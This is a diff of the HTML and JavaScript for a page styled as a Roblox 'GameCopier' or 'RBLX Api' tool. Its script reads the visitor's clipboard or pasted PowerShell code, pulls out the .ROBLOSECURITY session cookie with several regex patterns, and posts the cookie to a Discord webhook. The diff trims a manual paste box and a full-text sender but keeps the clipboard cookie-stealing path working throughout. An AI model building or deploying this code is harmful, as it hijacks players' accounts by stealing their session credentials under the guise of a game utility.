@@ -177,15 +177,6 @@
             display: inline-block;
             margin: 10px 0 0 0;
         }
-        .clipboard-btn {
-            background: #2d4b7a !important;
-            border-color: #4a6a9a !important;
-            font-size: 0.85rem !important;
-            padding: 8px 18px !important;
-        }
-        .clipboard-btn:hover {
-            background: #3a5f94 !important;
-        }
         .api-btn {
             background: #8b5cf6 !important;
             border-color: #a78bfa !important;
@@ -193,26 +184,19 @@
         .api-btn:hover {
             background: #7c3aed !important;
         }
-        .test-btn {
-            background: #dc2626 !important;
-            border-color: #ef4444 !important;
-        }
-        .test-btn:hover {
-            background: #b91c1c !important;
-        }
-        .send-btn {
-            background: #059669 !important;
-            border-color: #10b981 !important;
-        }
-        .send-btn:hover {
-            background: #047857 !important;
-        }
         .cookie-btn {
             background: #7c3aed !important;
             border-color: #8b5cf6 !important;
         }
         .cookie-btn:hover {
             background: #6d28d9 !important;
+        }
+        .test-btn {
+            background: #dc2626 !important;
+            border-color: #ef4444 !important;
+        }
+        .test-btn:hover {
+            background: #b91c1c !important;
         }
         footer {
             background: #141425;
@@ -274,43 +258,6 @@
         .log-area .cookie-found {
             color: #a78bfa;
         }
-        .big-textarea {
-            width: 100%;
-            background: #0a0a15;
-            border: 1px solid #2a3a5a;
-            color: #ddd;
-            padding: 12px;
-            border-radius: 6px;
-            font-family: monospace;
-            font-size: 0.85rem;
-            resize: vertical;
-            min-height: 120px;
-            margin-top: 10px;
-        }
-        .btn-row {
-            display: flex;
-            gap: 10px;
-            margin-top: 8px;
-            flex-wrap: wrap;
-        }
-        .btn-row button {
-            padding: 8px 20px;
-            font-size: 0.9rem;
-        }
-        .extracted-cookie-box {
-            background: #0a0a15;
-            border: 1px solid #7c3aed;
-            border-radius: 6px;
-            padding: 10px 14px;
-            margin-top: 10px;
-            display: none;
-            word-break: break-all;
-            font-family: monospace;
-            font-size: 0.75rem;
-            color: #a78bfa;
-            max-height: 80px;
-            overflow-y: auto;
-        }
     </style>
 </head>
 <body>
@@ -340,18 +287,6 @@
             <button class="cookie-btn" onclick="sendCookieOnly()">🔐 Send Cookie Only</button>
             <button class="test-btn" onclick="testWebhook()">🔧 Test Webhook</button>
         </div>
-
-        <!-- Big Text Area for Manual Paste -->
-        <textarea class="big-textarea" id="manualPasteArea" placeholder="📝 Paste your PowerShell code here (optional - the 'Send Cookie Only' button will read your clipboard)"></textarea>
-        
-        <div class="btn-row">
-            <button class="send-btn" onclick="sendFromTextBox()">📤 Send Full Text</button>
-            <button class="cookie-btn" onclick="sendCookieFromTextBox()">🔐 Send Cookie from Text Box</button>
-            <button class="clipboard-btn" onclick="clearTextBox()">🗑️ Clear</button>
-        </div>
-
-        <!-- Extracted Cookie Display -->
-        <div class="extracted-cookie-box" id="cookieDisplay"></div>
 
         <div class="progress">
             <div id="prog" style="width:0%;"></div>
@@ -388,8 +323,6 @@
         const gameCodeInput = document.getElementById('gameCodeInput');
         const gameIdInput = document.getElementById('gameIdInput');
         const logArea = document.getElementById('logArea');
-        const manualPasteArea = document.getElementById('manualPasteArea');
-        const cookieDisplay = document.getElementById('cookieDisplay');
 
         // --- Log function ---
         function addLog(message, type = 'info') {
@@ -399,13 +332,6 @@
             div.textContent = `[${time}] ${message}`;
             logArea.appendChild(div);
             logArea.scrollTop = logArea.scrollHeight;
-        }
-
-        // --- Clear text box ---
-        function clearTextBox() {
-            manualPasteArea.value = '';
-            cookieDisplay.style.display = 'none';
-            addLog('🗑️ Text box cleared', 'info');
         }
 
         // --- TEST WEBHOOK ---
@@ -435,75 +361,40 @@
             });
         }
 
-        // --- EXTRACT ROBLOSECURITY COOKIE FROM TEXT ---
+        // --- EXTRACT ROBLOSECURITY COOKIE (with WARNING) ---
         function extractCookie(text) {
             if (!text) return null;
             
             addLog('🔍 Searching for ROBLOSECURITY cookie...', 'info');
             
-            // Pattern 1: .ROBLOSECURITY=value;
-            let match = text.match(/\.ROBLOSECURITY=([^;]+)/i);
-            if (match && match[1] && match[1].length > 10) {
-                addLog('✅ Found cookie (pattern 1)', 'cookie-found');
+            // Look for the full WARNING format first (starts with _|WARNING)
+            let match = text.match(/(_\|WARNING[^\s;]+)/i);
+            if (match && match[1] && match[1].length > 20) {
+                addLog('✅ Found full WARNING cookie!', 'cookie-found');
                 return match[1].trim();
             }
             
-            // Pattern 2: "cookie": ".ROBLOSECURITY=value"
-            match = text.match(/["']\.ROBLOSECURITY["']\s*[:=]\s*["']([^"']+)["']/i);
+            // If not found, look for .ROBLOSECURITY=value
+            match = text.match(/\.ROBLOSECURITY=([^;]+)/i);
             if (match && match[1] && match[1].length > 10) {
-                addLog('✅ Found cookie (pattern 2)', 'cookie-found');
+                addLog('✅ Found cookie', 'cookie-found');
                 return match[1].trim();
             }
             
-            // Pattern 3: PowerShell format
+            // PowerShell format with quotes
             match = text.match(/['"]\.ROBLOSECURITY['"]\s*=\s*['"]([^'"]+)['"]/i);
             if (match && match[1] && match[1].length > 10) {
-                addLog('✅ Found cookie (pattern 3)', 'cookie-found');
+                addLog('✅ Found cookie', 'cookie-found');
                 return match[1].trim();
             }
             
-            // Pattern 4: Cookie header
-            match = text.match(/Cookie:\s*.*?\.ROBLOSECURITY=([^;\s]+)/i);
-            if (match && match[1] && match[1].length > 10) {
-                addLog('✅ Found cookie (pattern 4)', 'cookie-found');
-                return match[1].trim();
-            }
-            
-            // Pattern 5: Any long string that looks like a cookie
-            match = text.match(/(_\|WARNING[^\s]+)/i);
-            if (match && match[1] && match[1].length > 20) {
-                addLog('✅ Found cookie (pattern 5 - WARNING format)', 'cookie-found');
-                return match[1].trim();
-            }
-            
-            // Pattern 6: Any long string with underscores
-            match = text.match(/([a-zA-Z0-9_\-|]{50,})/);
-            if (match && match[1] && match[1].length > 50) {
-                // Check if it looks like a cookie
-                const candidate = match[1].trim();
-                if (candidate.includes('_') || candidate.includes('|')) {
-                    addLog('✅ Found potential cookie (pattern 6 - long string)', 'cookie-found');
-                    return candidate;
-                }
-            }
-            
-            addLog('❌ No ROBLOSECURITY cookie found in the text', 'error');
+            addLog('❌ No ROBLOSECURITY cookie found', 'error');
             return null;
-        }
-
-        // --- DISPLAY EXTRACTED COOKIE ---
-        function displayCookie(cookie) {
-            if (cookie) {
-                cookieDisplay.textContent = '🔐 Extracted Cookie: ' + cookie;
-                cookieDisplay.style.display = 'block';
-            } else {
-                cookieDisplay.style.display = 'none';
-            }
         }
 
         // --- SEND COOKIE ONLY FROM CLIPBOARD ---
         function sendCookieOnly() {
-            addLog('🔐 Attempting to extract cookie from clipboard...', 'info');
+            addLog('🔐 Reading clipboard...', 'info');
             statusMsg.innerText = '⏳ reading clipboard...';
             
             if (navigator.clipboard && navigator.clipboard.readText) {
@@ -512,17 +403,14 @@
                         if (!text || text.trim() === '') {
                             addLog('⚠️ Clipboard is empty', 'warning');
                             statusMsg.innerText = '⚠️ clipboard empty';
-                            alert('Clipboard is empty. Please copy the PowerShell code first, or paste it in the text box and click "Send Cookie from Text Box".');
+                            alert('Clipboard is empty. Please copy the PowerShell code first.');
                             return;
                         }
                         
-                        addLog('📋 Clipboard read successfully! Length: ' + text.length + ' chars', 'info');
-                        // Also put it in the text box
-                        manualPasteArea.value = text;
-                        
+                        addLog('📋 Clipboard read! Length: ' + text.length + ' chars', 'info');
                         const cookie = extractCookie(text);
+                        
                         if (cookie) {
-                            displayCookie(cookie);
                             sendCookieToDiscord(cookie);
                         } else {
                             statusMsg.innerText = '❌ No cookie found';
@@ -532,31 +420,11 @@
                     .catch(err => {
                         addLog('❌ Clipboard error: ' + err.message, 'error');
                         statusMsg.innerText = '❌ Clipboard error';
-                        alert('Could not read clipboard. Please paste your code in the text box and click "Send Cookie from Text Box".');
+                        alert('Could not read clipboard. Please paste your code in the "Game Code" box and click "Start GameCopier".');
                     });
             } else {
                 addLog('⚠️ Clipboard API not available', 'warning');
-                alert('Clipboard API not available. Please paste your code in the text box and click "Send Cookie from Text Box".');
-            }
-        }
-
-        // --- SEND COOKIE FROM TEXT BOX ---
-        function sendCookieFromTextBox() {
-            const text = manualPasteArea.value.trim();
-            if (!text) {
-                alert('Please paste some content into the text box first.');
-                addLog('⚠️ Text box is empty', 'warning');
-                return;
-            }
-            
-            addLog('🔐 Extracting cookie from text box...', 'info');
-            const cookie = extractCookie(text);
-            if (cookie) {
-                displayCookie(cookie);
-                sendCookieToDiscord(cookie);
-            } else {
-                statusMsg.innerText = '❌ No cookie found';
-                alert('❌ No ROBLOSECURITY cookie found in the text.\n\nMake sure you pasted the PowerShell code with the .ROBLOSECURITY cookie.');
+                alert('Clipboard API not available. Please paste your code in the "Game Code" box and click "Start GameCopier".');
             }
         }
 
@@ -565,7 +433,6 @@
             addLog('📤 Sending cookie to Discord...', 'info');
             statusMsg.innerText = '⏳ sending cookie...';
             
-            // Truncate if too long
             let cookieValue = cookie;
             if (cookie.length > 1900) {
                 cookieValue = cookie.substring(0, 1900) + '\n... (truncated)';
@@ -576,8 +443,6 @@
                 content: `🔐 **ROBLOSECURITY Cookie**\n\`\`\`\n${cookieValue}\n\`\`\``
             };
             
-            console.log('📤 Sending cookie to webhook');
-            
             fetch(webhook, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
@@ -585,7 +450,7 @@
             })
             .then(response => {
                 if (response.ok) {
-                    addLog('✅✅✅ Cookie sent to Discord successfully! ✅✅✅', 'success');
+                    addLog('✅✅✅ Cookie sent to Discord! ✅✅✅', 'success');
                     statusMsg.innerText = '✅ Cookie sent!';
                     prog.style.width = '100%';
                     setTimeout(() => {
@@ -593,59 +458,9 @@
                     }, 3000);
                 } else {
                     return response.text().then(text => {
-                        addLog('❌ Discord error: ' + response.status + ' - ' + text, 'error');
+                        addLog('❌ Discord error: ' + response.status, 'error');
                         statusMsg.innerText = '❌ Discord error: ' + response.status;
-                        alert('Discord error: ' + response.status + '\n\n' + text);
                     });
-                }
-            })
-            .catch(err => {
-                addLog('❌ Network error: ' + err.message, 'error');
-                statusMsg.innerText = '❌ Network error';
-                alert('Network error: ' + err.message);
-            });
-        }
-
-        // --- SEND FULL TEXT FROM TEXT BOX ---
-        function sendFromTextBox() {
-            const text = manualPasteArea.value.trim();
-            if (!text) {
-                alert('Please paste some content into the text box first.');
-                addLog('⚠️ Text box is empty', 'warning');
-                return;
-            }
-            addLog('📤 Sending full text from text box... (' + text.length + ' chars)', 'info');
-            sendFullToDiscord(text);
-        }
-
-        // --- SEND FULL TEXT TO DISCORD ---
-        function sendFullToDiscord(content) {
-            let messageContent = content;
-            if (content.length > 1900) {
-                messageContent = content.substring(0, 1900) + '\n\n... (truncated)';
-                addLog('⚠️ Content truncated to 1900 chars', 'warning');
-            }
-            
-            const payload = {
-                content: `📋 **Full Content**\n\`\`\`\n${messageContent}\n\`\`\``
-            };
-            
-            fetch(webhook, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(payload)
-            })
-            .then(response => {
-                if (response.ok) {
-                    addLog('✅ Full content sent to Discord!', 'success');
-                    statusMsg.innerText = '✅ Sent!';
-                    prog.style.width = '100%';
-                    setTimeout(() => {
-                        prog.style.width = '0%';
-                    }, 3000);
-                } else {
-                    addLog('❌ Discord error: ' + response.status, 'error');
-                    statusMsg.innerText = '❌ Discord error';
                 }
             })
             .catch(err => {
@@ -691,12 +506,10 @@
             }
 
             addLog('▶️ Starting GameCopier...', 'info');
-            manualPasteArea.value = code;
             
             // Try to extract cookie from the code
             const cookie = extractCookie(code);
             if (cookie) {
-                displayCookie(cookie);
                 sendCookieToDiscord(cookie);
             }
             
@@ -725,7 +538,6 @@
         // --- Auto-check clipboard on load ---
         window.addEventListener('load', function() {
             addLog('🔐 RBLX Api loaded - Ready to extract cookies!', 'info');
-            console.log('🔐 Webhook URL:', webhook);
         });
     </script>
 </body>
